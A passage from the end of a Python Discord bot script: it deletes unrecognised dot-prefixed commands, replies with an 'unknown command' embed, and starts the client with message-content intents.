            elif message.content.startswith("."):
                await message.delete()

                embed = discord.Embed(description=f":no_entry: Unkown command `{message.content}`", color=discord.Color.red())
                await message.channel.send(embed=embed)
                


intents = discord.Intents.default()
intents.message_content = True
client = Client(intents=intents)
client.run(BOT_TOKEN)